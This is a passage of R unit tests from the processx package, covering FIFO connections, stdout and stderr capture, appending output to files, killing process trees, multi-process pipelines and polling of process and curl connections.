  expect_equal(
    poll(list(reader), 10),
    list("timeout")
  )

  # Now we can write, on Windows as well
  expect_equal(
    conn_write(writer, "hello\nthere\n"),
    raw(0)
  )

  expect_equal(
    poll(list(reader), 1000),
    list("ready")
  )

  # Windows might read nothing the first time
  line <- conn_read_lines(reader, 1)
  if (!length(line)) {
    line <- conn_read_lines(reader, 1)
  }
  expect_equal(line, "hello")

  rest <- conn_read_chars(reader)
  expect_equal(rest, "there\n")

  expect_true(conn_is_incomplete(reader))
  expect_true(conn_is_incomplete(writer))

  close(writer)
  expect_equal(
    conn_read_lines(reader),
    character()
  )
  expect_false(conn_is_incomplete(reader))
})

test_that("write end first 2", {
  skip_on_cran()

  writer <- conn_create_fifo(write = TRUE)
  reader <- conn_connect_fifo(conn_file_name(writer), read = TRUE)
  expect_equal(
    conn_write(writer, "hello\nthere\n"),
    raw(0)
  )

  expect_equal(
    poll(list(reader), 1000),
    list("ready")
  )

  # Windows might read nothing the first time
  line <- conn_read_lines(reader, 1)
  if (!length(line)) {
    line <- conn_read_lines(reader, 1)
  }
  expect_equal(line, "hello")

  rest <- conn_read_chars(reader)
  expect_equal(rest, "there\n")

  expect_true(conn_is_incomplete(reader))
  expect_true(conn_is_incomplete(writer))

  close(writer)
  expect_equal(
    conn_read_lines(reader),
    character()
  )
  expect_false(conn_is_incomplete(reader))
})

test_that("errors", {
  skip_on_cran()
  skip_if_no_srcrefs()

  expect_snapshot(error = TRUE, conn_create_fifo(read = TRUE, write = TRUE))

  reader <- conn_create_fifo(read = TRUE)
  on.exit(close(reader), add = TRUE)

  expect_snapshot(
    error = TRUE,
    conn_connect_fifo(read = TRUE, write = TRUE)
  )

  if (!is_windows()) {
    expect_error(
      conn_create_fifo(tempdir(), read = TRUE)
    )

    fifo <- tempfile()
    expect_error(
      conn_connect_fifo(fifo)
    )
  }
})
````

### `px390/processx/tests/testthat/test-io.R`

````r
test_that("Output and error are discarded by default", {
  skip_if_no_srcrefs()
  px <- get_tool("px")
  p <- process$new(px, c("outln", "foobar"))
  on.exit(try_silently(p$kill(grace = 0)), add = TRUE)

  expect_snapshot(error = TRUE, {
    p$read_output_lines(n = 1)
    p$read_all_output_lines()
    p$read_all_output()
    p$read_error_lines(n = 1)
    p$read_all_error_lines()
    p$read_all_error()
  })
})

test_that("We can get the output", {
  px <- get_tool("px")

  p <- process$new(
    px,
    c("out", "foo\nbar\nfoobar\n"),
    stdout = "|",
    stderr = "|"
  )
  on.exit(try_silently(p$kill(grace = 0)), add = TRUE)

  out <- p$read_all_output_lines()
  expect_identical(out, c("foo", "bar", "foobar"))
})

test_that("We can get the error stream", {
  tmp <- tempfile(fileext = ".bat")
  on.exit(unlink(tmp), add = TRUE)

  cat(">&2 echo hello", ">&2 echo world", sep = "\n", file = tmp)
  Sys.chmod(tmp, "700")

  p <- process$new(tmp, stderr = "|")
  on.exit(try_silently(p$kill(grace = 0)), add = TRUE)

  out <- sort(p$read_all_error_lines())
  expect_identical(out, c("hello", "world"))
})

test_that("Output & error at the same time", {
  tmp <- tempfile(fileext = ".bat")
  on.exit(unlink(tmp), add = TRUE)

  cat(
    if (os_type() == "windows") "@echo off",
    ">&2 echo hello",
    "echo wow",
    ">&2 echo world",
    "echo wooow",
    sep = "\n",
    file = tmp
  )
  Sys.chmod(tmp, "700")

  p <- process$new(tmp, stdout = "|", stderr = "|")
  on.exit(try_silently(p$kill(grace = 0)), add = TRUE)

  out <- p$read_all_output_lines()
  expect_identical(out, c("wow", "wooow"))

  err <- p$read_all_error_lines()
  expect_identical(err, c("hello", "world"))
})

test_that("Output and error to specific files", {
  tmp <- tempfile(fileext = ".bat")
  on.exit(unlink(tmp), add = TRUE)

  cat(
    if (os_type() == "windows") "@echo off",
    ">&2 echo hello",
    "echo wow",
    ">&2 echo world",
    "echo wooow",
    sep = "\n",
    file = tmp
  )
  Sys.chmod(tmp, "700")

  tmpout <- tempfile()
  tmperr <- tempfile()

  p <- process$new(tmp, stdout = tmpout, stderr = tmperr)
  on.exit(try_silently(p$kill(grace = 0)), add = TRUE)

  p$wait()

  ## In theory this is a race condition, because the OS might be still
  ## writing the files. But it is hard to wait until they are done.
  ## We'll see if this fails in practice, hopefully not.
  expect_identical(readLines(tmpout), c("wow", "wooow"))
  expect_identical(readLines(tmperr), c("hello", "world"))
})

test_that("Output and error can be appended to files with >>", {
  px <- get_tool("px")
  tmpout <- tempfile()
  tmperr <- tempfile()
  on.exit(unlink(c(tmpout, tmperr)), add = TRUE)

  ## Write initial content into the files
  writeLines("existing-out", tmpout)
  writeLines("existing-err", tmperr)

  p <- process$new(
    px,
    c("outln", "appended-out", "errln", "appended-err"),
    stdout = paste0(">>", tmpout),
    stderr = paste0(">>", tmperr)
  )
  on.exit(try_silently(p$kill(grace = 0)), add = TRUE)
  p$wait()

  expect_identical(readLines(tmpout), c("existing-out", "appended-out"))
  expect_identical(readLines(tmperr), c("existing-err", "appended-err"))

  ## Also verify that get_output_file / get_error_file return the plain path
  ## (use normalizePath on both sides to handle platform symlinks like
  ## /var -> /private/var on macOS)
  expect_identical(
    normalizePath(p$get_output_file()),
    normalizePath(tmpout)
  )
  expect_identical(
    normalizePath(p$get_error_file()),
    normalizePath(tmperr)
  )
})

test_that(">> creates the file if it does not exist", {
  px <- get_tool("px")
  tmpout <- tempfile()
  tmperr <- tempfile()
  on.exit(unlink(c(tmpout, tmperr)), add = TRUE)

  ## Files must not exist before the process runs
  expect_false(file.exists(tmpout))
  expect_false(file.exists(tmperr))

  p <- process$new(
    px,
    c("outln", "new-out", "errln", "new-err"),
    stdout = paste0(">>", tmpout),
    stderr = paste0(">>", tmperr)
  )
  on.exit(try_silently(p$kill(grace = 0)), add = TRUE)
  p$wait()

  expect_identical(readLines(tmpout), "new-out")
  expect_identical(readLines(tmperr), "new-err")
})

test_that("is_incomplete", {
  px <- get_tool("px")
  p <- process$new(px, c("out", "foo\nbar\nfoobar\n"), stdout = "|")
  on.exit(p$kill(), add = TRUE)

  expect_true(p$is_incomplete_output())

  p$read_output_lines(n = 1)
  expect_true(p$is_incomplete_output())

  p$read_all_output_lines()
  expect_false(p$is_incomplete_output())
})

test_that("readChar on IO, unix", {
  ## Need to skip, because of the different EOL character
  skip_other_platforms("unix")

  px <- get_tool("px")

  p <- process$new(px, c("outln", "hello world!"), stdout = "|")
  on.exit(p$kill(), add = TRUE)
  p$wait()

  p$poll_io(-1)
  expect_equal(p$read_output(5), "hello")
  expect_equal(p$read_output(5), " worl")
  expect_equal(p$read_output(5), "d!\n")
})

test_that("readChar on IO, windows", {
  ## Need to skip, because of the different EOL character
  skip_other_platforms("windows")

  px <- get_tool("px")
  p <- process$new(px, c("outln", "hello world!"), stdout = "|")
  on.exit(p$kill(), add = TRUE)
  p$wait()

  p$poll_io(-1)
  expect_equal(p$read_output(5), "hello")
  p$poll_io(-1)
  expect_equal(p$read_output(5), " worl")
  p$poll_io(-1)
  expect_equal(p$read_output(5), "d!\r\n")
})

test_that("same pipe", {
  skip_if_no_srcrefs()
  px <- get_tool("px")
  cmd <- c("out", "o1", "err", "e1", "out", "o2", "err", "e2")
  p <- process$new(px, cmd, stdout = "|", stderr = "2>&1")
  on.exit(p$kill(), add = TRUE)
  p$wait(2000)
  expect_equal(p$get_exit_status(), 0L)

  out <- p$read_all_output()
  expect_equal(out, "o1e1o2e2")
  expect_snapshot(error = TRUE, p$read_all_error_lines())
})

test_that("same file", {
  skip_if_no_srcrefs()
  px <- get_tool("px")
  cmd <- c("out", "o1", "err", "e1", "out", "o2", "errln", "e2")
  tmp <- tempfile()
  on.exit(unlink(tmp, recursive = TRUE), add = TRUE)
  p <- process$new(px, cmd, stdout = tmp, stderr = "2>&1")
  p$wait(2000)
  p$kill()
  expect_equal(p$get_exit_status(), 0L)

  expect_equal(readLines(tmp), "o1e1o2e2")
  expect_snapshot(error = TRUE, p$read_all_output_lines())
  expect_snapshot(error = TRUE, p$read_all_error_lines())
})

test_that("same NULL, for completeness", {
  skip_if_no_srcrefs()
  px <- get_tool("px")
  cmd <- c("out", "o1", "err", "e1", "out", "o2", "errln", "e2")
  p <- process$new(px, cmd, stdout = NULL, stderr = "2>&1")
  p$wait(2000)
  p$kill()
  expect_equal(p$get_exit_status(), 0L)
  expect_snapshot(error = TRUE, p$read_all_output_lines())
  expect_snapshot(error = TRUE, p$read_all_error_lines())
})
````

### `px390/processx/tests/testthat/test-kill-tree.R`

````r
test_that("tree ids are inherited", {
  skip_on_cran()
  skip_if_no_ps()

  px <- get_tool("px")

  p <- process$new(px, c("sleep", "10"))
  on.exit(p$kill(), add = TRUE)
  ep <- ps::ps_handle(p$get_pid())

  ev <- paste0("PROCESSX_", get_private(p)$tree_id)

  ## On Windows, if the process hasn't been initialized yet,
  ## this will return ERROR_PARTIAL_COPY (System error 299).
  ## Until this is fixed in ps, we just retry a couple of times.
  env <- "failed"
  deadline <- get_deadline(secs = 3)
  while (TRUE) {
    if (Sys.time() >= deadline) {
      break
    }
    tryCatch(
      {
        env <- ps::ps_environ(ep)[[ev]]
        break
      },
      error = function(e) e
    )
    Sys.sleep(0.05)
  }

  expect_true(Sys.time() < deadline)
  expect_equal(env, "YES")
})

test_that("tree ids are inherited if env is specified", {
  skip_on_cran()
  skip_if_no_ps()

  px <- get_tool("px")

  p <- process$new(px, c("sleep", "10"), env = c(FOO = "bar"))
  on.exit(p$kill(), add = TRUE)

  ep <- ps::ps_handle(p$get_pid())

  ev <- paste0("PROCESSX_", get_private(p)$tree_id)

  ## On Windows, if the process hasn't been initialized yet,
  ## this will return ERROR_PARTIAL_COPY (System error 299).
  ## Until this is fixed in ps, we just retry a couple of times.
  env <- "failed"
  deadline <- get_deadline(secs = 3)
  while (TRUE) {
    if (Sys.time() >= deadline) {
      break
    }
    tryCatch(
      {
        env <- ps::ps_environ(ep)[[ev]]
        break
      },
      error = function(e) e
    )
    Sys.sleep(0.05)
  }

  expect_true(Sys.time() < deadline)
  expect_equal(ps::ps_environ(ep)[[ev]], "YES")
  expect_equal(ps::ps_environ(ep)[["FOO"]], "bar")
})

test_that("kill_tree", {
  skip_on_cran()
  skip_if_no_ps()

  px <- get_tool("px")
  p <- process$new(px, c("sleep", "100"))
  on.exit(p$kill(), add = TRUE)

  res <- p$kill_tree()
  expect_true(any(c("px", "px.exe") %in% names(res)))
  expect_true(p$get_pid() %in% res)

  deadline <- Sys.time() + 1
  while (p$is_alive() && Sys.time() < deadline) {
    Sys.sleep(0.05)
  }
  expect_true(Sys.time() < deadline)
  expect_false(p$is_alive())
})

test_that("kill_tree with children", {
  skip_on_cran()
  skip_if_no_ps()
  # temporarily
  if (getRversion() >= "4.0.0" && is_windows()) {
    skip("Fails on Windows & new R")
  }

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  p <- callr::r_bg(
    function(px, tmp) {
      processx::run(
        px,
        c("outln", "ok", "sleep", "100"),
        stdout_callback = function(x, p) cat(x, file = tmp, append = TRUE)
      )
    },
    args = list(px = get_tool("px"), tmp = tmp)
  )

  deadline <- get_deadline(secs = 5)
  while (!file.exists(tmp) && Sys.time() < deadline) {
    Sys.sleep(0.05)
  }
  expect_true(Sys.time() < deadline)

  res <- p$kill_tree()
  expect_true(any(c("px", "px.exe") %in% names(res)))
  expect_true(any(c("R", "Rterm.exe") %in% names(res)))
  expect_true(p$get_pid() %in% res)

  deadline <- get_deadline()
  while (p$is_alive() && Sys.time() < deadline) {
    Sys.sleep(0.05)
  }
  expect_true(Sys.time() < deadline)
  expect_false(p$is_alive())
})

test_that("kill_tree and orphaned children", {
  skip_on_cran()
  skip_if_no_ps()

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  p1 <- callr::r_bg(
    function(px, tmp) {
      p <- processx::process$new(
        px,
        c("outln", "ok", "sleep", "100"),
        stdout = tmp,
        cleanup = FALSE
      )
      list(
        pid = p$get_pid(),
        create_time = p$get_start_time(),
        id = p$.__enclos_env__$private$tree_id
      )
    },
    args = list(px = get_tool("px"), tmp = tmp)
  )

  p1$wait()
  pres <- p1$get_result()

  ps <- ps::ps_handle(pres$pid)
  expect_true(ps::ps_is_running(ps))

  deadline <- get_deadline(secs = 2)
  while (
    (!file.exists(tmp) || file_size(tmp) == 0) &&
      Sys.time() < deadline
  ) {
    Sys.sleep(0.05)
  }
  expect_true(Sys.time() < deadline)

  res <- p1$kill_tree(pres$id)
  expect_true(any(c("px", "px.exe") %in% names(res)))

  deadline <- get_deadline()
  while (
    ps::ps_is_running(ps) &&
      ps::ps_status(ps) != "zombie" &&
      Sys.time() < deadline
  ) {
    Sys.sleep(0.05)
  }
  expect_true(Sys.time() < deadline)
  expect_true(!ps::ps_is_running(ps) || ps::ps_status(ps) == "zombie")
})

test_that("cleanup_tree option", {
  skip_on_cran()
  skip_if_no_ps()

  px <- get_tool("px")
  p <- process$new(px, c("sleep", "100"), cleanup_tree = TRUE)
  on.exit(try(p$kill(), silent = TRUE), add = TRUE)

  ps <- p$as_ps_handle()

  rm(p)
  gc()
  gc()

  deadline <- get_deadline()
  while (ps::ps_is_running(ps) && Sys.time() < deadline) {
    Sys.sleep(0.05)
  }
  expect_true(Sys.time() < deadline)
  expect_false(ps::ps_is_running(ps))
})

test_that("cleanup_tree stress test", {
  skip_on_cran()
  skip_if_no_ps()

  do <- function() {
    px <- get_tool("px")
    p <- process$new(px, c("sleep", "100"), cleanup_tree = TRUE)
    on.exit(try(p$kill(), silent = TRUE), add = TRUE)

    ps <- p$as_ps_handle()

    rm(p)
    gc()
    gc()

    deadline <- get_deadline()
    while (ps::ps_is_running(ps) && Sys.time() < deadline) {
      Sys.sleep(0.05)
    }
    expect_true(Sys.time() < deadline)
    expect_false(ps::ps_is_running(ps))
  }

  for (i in 1:50) {
    do()
  }
})
````

### `px390/processx/tests/testthat/test-pipeline.R`

````r
test_that("2-process pipeline: sort | uniq", {
  skip_on_cran()
  skip_on_os("windows")

  pl <- pipeline$new(
    list(c("sort"), c("uniq")),
    stdin = "|",
    stdout = "|"
  )
  on.exit(pl$kill(), add = TRUE)

  pl$write_input("b\na\nb\na\n")
  pl$close_input()
  out <- pl$read_all_output_lines()
  pl$wait()

  expect_equal(out, c("a", "b"))
  expect_equal(pl$get_exit_statuses(), list(0L, 0L))
})

test_that("3-process pipeline: cat | sort | uniq", {
  skip_on_cran()
  skip_on_os("windows")

  pl <- pipeline$new(
    list(c("cat"), c("sort"), c("uniq")),
    stdin = "|",
    stdout = "|"
  )
  on.exit(pl$kill(), add = TRUE)

  pl$write_input("b\na\nb\na\n")
  pl$close_input()
  out <- pl$read_all_output_lines()
  pl$wait()

  expect_equal(out, c("a", "b"))
  expect_equal(pl$get_exit_statuses(), list(0L, 0L, 0L))
})

test_that("single-process pipeline is equivalent to process$new()", {
  skip_on_cran()
  skip_on_os("windows")

  pl <- pipeline$new(list(c("echo", "hello")), stdout = "|")
  on.exit(pl$kill(), add = TRUE)

  pl$wait()
  out <- trimws(pl$read_all_output())
  expect_equal(out, "hello")
  expect_equal(pl$get_exit_statuses(), list(0L))
})

test_that("pipeline is_alive() and get_pids()", {
  skip_on_cran()
  skip_on_os("windows")

  pl <- pipeline$new(
    list(c("sort"), c("cat")),
    stdin = "|",
    stdout = "|"
  )
  on.exit(pl$kill(), add = TRUE)

  expect_true(pl$is_alive())
  pids <- pl$get_pids()
  expect_length(pids, 2L)
  expect_true(all(pids > 0L))

  pl$close_input()
  pl$wait()
  expect_false(pl$is_alive())
})

test_that("pipeline get_processes() returns process objects", {
  skip_on_cran()
  skip_on_os("windows")

  pl <- pipeline$new(
    list(c("sort"), c("uniq")),
    stdin = "|",
    stdout = "|"
  )
  on.exit(pl$kill(), add = TRUE)

  procs <- pl$get_processes()
  expect_length(procs, 2L)
  expect_true(all(vapply(procs, inherits, logical(1L), "process")))

  pl$close_input()
  pl$wait()
})

test_that("pipeline kill() stops all processes", {
  skip_on_cran()
  skip_on_os("windows")

  pl <- pipeline$new(
    list(c("cat"), c("cat")),
    stdin = "|",
    stdout = "|"
  )

  expect_true(pl$is_alive())
  pl$kill()
  Sys.sleep(0.1)
  expect_false(pl$is_alive())
})

test_that("pipeline stdout to file", {
  skip_on_cran()
  skip_on_os("windows")

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)

  pl <- pipeline$new(
    list(c("sort"), c("uniq")),
    stdin = "|",
    stdout = tmp
  )
  on.exit(pl$kill(), add = TRUE)

  pl$write_input("b\na\nb\na\n")
  pl$close_input()
  pl$wait()

  expect_equal(readLines(tmp), c("a", "b"))
  expect_equal(pl$get_exit_statuses(), list(0L, 0L))
})

test_that("conn_create_proc_pipepair() returns write/read ends", {
  skip_on_cran()

  pipe <- conn_create_proc_pipepair()
  on.exit({
    try(close(pipe[[1]]), silent = TRUE)
    try(close(pipe[[2]]), silent = TRUE)
  }, add = TRUE)

  expect_length(pipe, 2L)
  expect_true(is_connection(pipe[[1]]))
  expect_true(is_connection(pipe[[2]]))
})

test_that("px single-process pipeline", {
  skip_on_cran()
  px <- get_tool("px")

  pl <- pipeline$new(list(c(px, "outln", "hello")), stdout = "|")
  on.exit(pl$kill(), add = TRUE)

  pl$wait()
  out <- trimws(pl$read_all_output())
  expect_equal(out, "hello")
  expect_equal(pl$get_exit_statuses(), list(0L))
})

test_that("px 2-process pipeline: passthrough", {
  skip_on_cran()
  px <- get_tool("px")

  pl <- pipeline$new(
    list(c(px, "cat", "<stdin>"), c(px, "cat", "<stdin>")),
    stdin = "|",
    stdout = "|"
  )
  on.exit(pl$kill(), add = TRUE)

  pl$write_input("hello\nworld")
  pl$close_input()
  out <- pl$read_all_output_lines()
  pl$wait()

  expect_equal(out, c("hello", "world"))
  expect_equal(pl$get_exit_statuses(), list(0L, 0L))
})

test_that("px 3-process pipeline: passthrough", {
  skip_on_cran()
  px <- get_tool("px")

  pl <- pipeline$new(
    list(
      c(px, "cat", "<stdin>"),
      c(px, "cat", "<stdin>"),
      c(px, "cat", "<stdin>")
    ),
    stdin = "|",
    stdout = "|"
  )
  on.exit(pl$kill(), add = TRUE)

  pl$write_input("hello\nworld")
  pl$close_input()
  out <- pl$read_all_output_lines()
  pl$wait()

  expect_equal(out, c("hello", "world"))
  expect_equal(pl$get_exit_statuses(), list(0L, 0L, 0L))
})

test_that("px pipeline is_alive() and get_pids()", {
  skip_on_cran()
  px <- get_tool("px")

  pl <- pipeline$new(
    list(c(px, "cat", "<stdin>"), c(px, "cat", "<stdin>")),
    stdin = "|",
    stdout = "|"
  )
  on.exit(pl$kill(), add = TRUE)

  expect_true(pl$is_alive())
  pids <- pl$get_pids()
  expect_length(pids, 2L)
  expect_true(all(pids > 0L))

  pl$close_input()
  pl$wait()
  expect_false(pl$is_alive())
})

test_that("px pipeline kill() stops all processes", {
  skip_on_cran()
  px <- get_tool("px")

  pl <- pipeline$new(
    list(c(px, "cat", "<stdin>"), c(px, "cat", "<stdin>")),
    stdin = "|",
    stdout = "|"
  )

  expect_true(pl$is_alive())
  pl$kill()
  pl$wait()
  expect_false(pl$is_alive())
})

test_that("px pipeline stdout to file", {
  skip_on_cran()
  px <- get_tool("px")

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)

  pl <- pipeline$new(
    list(c(px, "cat", "<stdin>"), c(px, "cat", "<stdin>")),
    stdin = "|",
    stdout = tmp
  )
  on.exit(pl$kill(), add = TRUE)

  pl$write_input("hello\nworld\n")
  pl$close_input()
  pl$wait()

  expect_equal(readLines(tmp), c("hello", "world"))
  expect_equal(pl$get_exit_statuses(), list(0L, 0L))
})
````

### `px390/processx/tests/testthat/test-poll-connections.R`

````r
test_that("poll a connection", {
  px <- get_tool("px")
  p <- process$new(px, c("sleep", ".5", "outln", "foobar"), stdout = "|")
  on.exit(p$kill())
  out <- p$get_output_connection()

  ## Timeout
  expect_equal(poll(list(out), 0)[[1]], "timeout")

  expect_equal(poll(list(out), 2000)[[1]], "ready")

  p$read_output_lines()
  expect_equal(poll(list(out), 2000)[[1]], "ready")

  close(out)
  expect_equal(poll(list(out), 0)[[1]], "closed")
})

test_that("poll a connection and a process", {
  px <- get_tool("px")
  p1 <- process$new(px, c("sleep", ".5", "outln", "foobar"), stdout = "|")
  p2 <- process$new(px, c("sleep", ".5", "outln", "foobar"), stdout = "|")
  on.exit(p1$kill(), add = TRUE)
  on.exit(p2$kill(), add = TRUE)
  out <- p1$get_output_connection()

  ## Timeout
  expect_equal(
    poll(list(out, p2), 0),
    list(
      "timeout",
      c(output = "timeout", error = "nopipe", process = "nopipe")
    )
  )

  ## At least one of them is ready. Usually both on Unix, but on Windows
  ## it is different because the IOCP is a queue
  pr <- poll(list(out, p2), 2000)
  expect_true(pr[[1]] == "ready" || pr[[2]][["output"]] == "ready")

  p1$poll_io(2000)
  p2$poll_io(2000)
  p1$read_output_lines()
  p2$read_output_lines()
  pr <- poll(list(out, p2), 2000)
  expect_true(pr[[1]] == "ready" || pr[[2]][["output"]] == "ready")

  p1$kill(close_connections = FALSE)
  p2$kill(close_connections = FALSE)
  pr <- poll(list(out, p2), 2000)
  expect_true(pr[[1]] == "ready" || pr[[2]][["output"]] == "ready")

  close(out)
  close(p2$get_output_connection())
  expect_equal(
    poll(list(out, p2), 2000),
    list("closed", c(output = "closed", error = "nopipe", process = "nopipe"))
  )
})
````

### `px390/processx/tests/testthat/test-poll-curl.R`

````r
test_that("curl fds", {
  skip_on_cran()

  resp <- list()
  errm <- character()
  done <- function(x) resp <<- c(resp, list(x))
  fail <- function(x) errm <<- c(errm, x)

  pool <- curl::new_pool()
  url1 <- httpbin$url("/status/200")
  url2 <- httpbin$url("/delay/1")
  curl::multi_add(
    pool = pool,
    curl::new_handle(url = url1, http_version = 2),
    done = done,
    fail = fail
  )
  curl::multi_add(
    pool = pool,
    curl::new_handle(url = url1, http_version = 2),
    done = done,
    fail = fail
  )
  curl::multi_add(
    pool = pool,
    curl::new_handle(url = url2, http_version = 2),
    done = done,
    fail = fail
  )
  curl::multi_add(
    pool = pool,
    curl::new_handle(url = url1, http_version = 2),
    done = done,
    fail = fail
  )
  curl::multi_add(
    pool = pool,
    curl::new_handle(url = url1, http_version = 2),
    done = done,
    fail = fail
  )

  # This does not do much, but at least it tests that we can poll()
  # libcurl's file descriptors

  timeout <- Sys.time() + 5
  repeat {
    fds <- curl::multi_fdset(pool = pool)
    if (length(fds$reads) > 0) {
      pr <- poll(list(curl_fds(fds)), 1000)
    }
    state <- curl::multi_run(timeout = 0.1, pool = pool, poll = TRUE)
    if (state$pending == 0 || Sys.time() >= timeout) break
  }

  expect_true(Sys.time() < timeout)
  expect_equal(vapply(resp, "[[", "", "url"), c(rep(url1, 4), url2))
})

test_that("curl fds before others", {
  skip_on_cran()

  pool <- curl::new_pool()
  url <- httpbin$url("/delay/1")
  curl::multi_add(pool = pool, curl::new_handle(url = url, http_version = 2))

  timeout <- Sys.time() + 5
  repeat {
    state <- curl::multi_run(timeout = 1 / 10000, pool = pool, poll = TRUE)
    fds <- curl::multi_fdset(pool = pool)
    if (length(fds$reads) > 0) {
      break
    }
    if (Sys.time() >= timeout) break
  }

  expect_true(Sys.time() < timeout)

  px <- get_tool("px")
  pp <- process$new(get_tool("px"), c("sleep", "10"))
  on.exit(pp$kill(), add = TRUE)

  pr <- poll(list(pp, curl_fds(fds)), 10000)
  expect_equal(
    pr,
    list(c(output = "nopipe", error = "nopipe", process = "silent"), "event")
  )

  pp$kill()
})

test_that("process fd before curl fd", {
  skip_on_cran()

  pool <- curl::new_pool()
  url <- httpbin$url("/delay/10")
  curl::multi_add(pool = pool, curl::new_handle(url = url, http_version = 2))

  timeout <- Sys.time() + 5
  repeat {
    state <- curl::multi_run(timeout = 1 / 10000, pool = pool, poll = TRUE)
    fds <- curl::multi_fdset(pool = pool)
    if (length(fds$reads) > 0 && length(fds$writes) == 0) {
      break
    }
    if (Sys.time() >= timeout) break
  }

  expect_true(Sys.time() < timeout)

  px <- get_tool("px")
  pp <- process$new(get_tool("px"), c("outln", "done"))
  on.exit(pp$kill(), add = TRUE)

  pr <- poll(list(pp, curl_fds(fds)), 10000)
  expect_equal(
    pr,
    list(c(output = "nopipe", error = "nopipe", process = "ready"), "silent")
  )

  pp$kill()
})
````

### `px390/processx/tests/testthat/test-poll-stress.R`

````r
test_that("many processes", {
  skip_on_cran()

  ## Create many processes
  num <- 100
  px <- get_tool("px")
  on.exit(try(lapply(pp, function(x) x$kill()), silent = TRUE), add = TRUE)
  pp <- lapply(1:num, function(i) {
    cmd <- c("sleep", "1", "outln", paste("out", i), "errln", paste("err", i))
    process$new(px, cmd, stdout = "|", stderr = "|")
  })

  ## poll them
  results <- replicate(num, list(character(), character()), simplify = FALSE)
  while (TRUE) {
    pr <- poll(pp, -1)
    lapply(seq_along(pp), function(i) {
      if (pr[[i]]["output"] == "ready") {
        results[[i]][[1]] <<- c(results[[i]][[1]], pp[[i]]$read_output_lines())
      }
      if (pr[[i]]["error"] == "ready") {
        results[[i]][[2]] <<- c(results[[i]][[2]], pp[[i]]$read_error_lines())
      }
    })
    inc <- sapply(
      pp,
      function(x) x$is_incomplete_output() || x$is_incomplete_error()
    )
    if (!any(inc)) break
  }

  exp <- lapply(1:num, function(i) list(paste("out", i), paste("err", i)))
  expect_identical(exp, results)
})
````

### `px390/processx/tests/testthat/test-poll.R`

````r
test_that("polling for output available", {
  px <- get_tool("px")
  p <- process$new(px, c("sleep", "1", "outln", "foobar"), stdout = "|")

  ## Timeout
  expect_equal(
    p$poll_io(0),
    c(output = "timeout", error = "nopipe", process = "nopipe")
  )

  p$wait()
  expect_equal(
    p$poll_io(-1),
    c(output = "ready", error = "nopipe", process = "nopipe")
  )

  p$read_output_lines()
  expect_equal(
    p$poll_io(-1),
    c(output = "ready", error = "nopipe", process = "nopipe")
  )

  p$kill(close_connections = FALSE)
  expect_equal(
    p$poll_io(-1),
    c(output = "ready", error = "nopipe", process = "nopipe")
  )

  close(p$get_output_connection())
  expect_equal(
    p$poll_io(-1),
    c(output = "closed", error = "nopipe", process = "nopipe")
  )
})

test_that("polling for stderr", {
  px <- get_tool("px")
  p <- process$new(px, c("sleep", "1", "errln", "foobar"), stderr = "|")

  ## Timeout
  expect_equal(
    p$poll_io(0),
    c(output = "nopipe", error = "timeout", process = "nopipe")
  )

  p$wait()
  expect_equal(
    p$poll_io(-1),
    c(output = "nopipe", error = "ready", process = "nopipe")
  )

  p$read_error_lines()
  expect_equal(
    p$poll_io(-1),
    c(output = "nopipe", error = "ready", process = "nopipe")
  )

  p$kill(close_connections = FALSE)
  expect_equal(
    p$poll_io(-1),
    c(output = "nopipe", error = "ready", process = "nopipe")
  )

  close(p$get_error_connection())
  expect_equal(
    p$poll_io(-1),
    c(output = "nopipe", error = "closed", process = "nopipe")
  )
})

test_that("polling for both stdout and stderr", {
  px <- get_tool("px")
  p <- process$new(
    px,
    c("sleep", "1", "errln", "foo", "outln", "bar"),
    stdout = "|",
    stderr = "|"
  )

  ## Timeout
  expect_equal(
    p$poll_io(0),
    c(output = "timeout", error = "timeout", process = "nopipe")
  )

  p$wait()
  expect_true("ready" %in% p$poll_io(-1))

  p$read_error_lines()
  expect_true("ready" %in% p$poll_io(-1))

  p$kill(close_connections = FALSE)
  expect_true("ready" %in% p$poll_io(-1))

  close(p$get_output_connection())
  close(p$get_error_connection())
  expect_equal(
    p$poll_io(-1),
    c(output = "closed", error = "closed", process = "nopipe")
  )
})

test_that("multiple polls", {
  px <- get_tool("px")
  p <- process$new(
    px,
    c("sleep", "1", "outln", "foo", "sleep", "1", "outln", "bar"),
    stdout = "|",
    stderr = "|"
  )
  on.exit(p$kill(), add = TRUE)

  out <- character()
  while (p$is_alive()) {
    p$poll_io(2000)
    out <- c(out, p$read_output_lines())
  }

  expect_identical(out, c("foo", "bar"))
})
````

### `px390/processx/tests/testthat/test-poll2.R`

````r
test_that("single process", {
  px <- get_tool("px")
  p <- process$new(
    px,
    c("sleep", "1", "outln", "foo", "outln", "bar"),
    stdout = "|"
  )
  on.exit(p$kill(), add = TRUE)

  ## Timeout
  expect_equal(
    poll(list(p), 0),
    list(c(output = "timeout", error = "nopipe", process = "nopipe"))
  )

  p$wait()
  expect_equal(
    poll(list(p), -1),
    list(c(output = "ready", error = "nopipe", process = "nopipe"))
  )

  p$read_output_lines()
  expect_equal(
    poll(list(p), -1),
    list(c(output = "ready", error = "nopipe", process = "nopipe"))
  )

  p$kill(close_connections = FALSE)
  expect_equal(
    poll(list(p), -1),
    list(c(output = "ready", error = "nopipe", process = "nopipe"))
  )

  close(p$get_output_connection())
  expect_equal(
    poll(list(p), -1),
    list(c(output = "closed", error = "nopipe", process = "nopipe"))
  )
})

test_that("multiple processes", {
  px <- get_tool("px")
  cmd1 <- c("sleep", "1", "outln", "foo", "outln", "bar")
  cmd2 <- c("sleep", "2", "errln", "foo", "errln", "bar")

  p1 <- process$new(px, cmd1, stdout = "|")
  p2 <- process$new(px, cmd2, stderr = "|")

  ## Timeout
  res <- poll(list(p1 = p1, p2 = p2), 0)
  expect_equal(
    res,
    list(
      p1 = c(output = "timeout", error = "nopipe", process = "nopipe"),
      p2 = c(output = "nopipe", error = "timeout", process = "nopipe")
    )
  )

  p1$wait()
  res <- poll(list(p1 = p1, p2 = p2), -1)
  expect_equal(
    res$p1,
    c(output = "ready", error = "nopipe", process = "nopipe")
  )
  expect_equal(res$p2[["output"]], "nopipe")
  expect_true(res$p2[["error"]] %in% c("silent", "ready"))

  close(p1$get_output_connection())
  p2$wait()
  res <- poll(list(p1 = p1, p2 = p2), -1)
  expect_equal(
    res,
    list(
      p1 = c(output = "closed", error = "nopipe", process = "nopipe"),
      p2 = c(output = "nopipe", error = "ready", process = "nopipe")
    )
  )

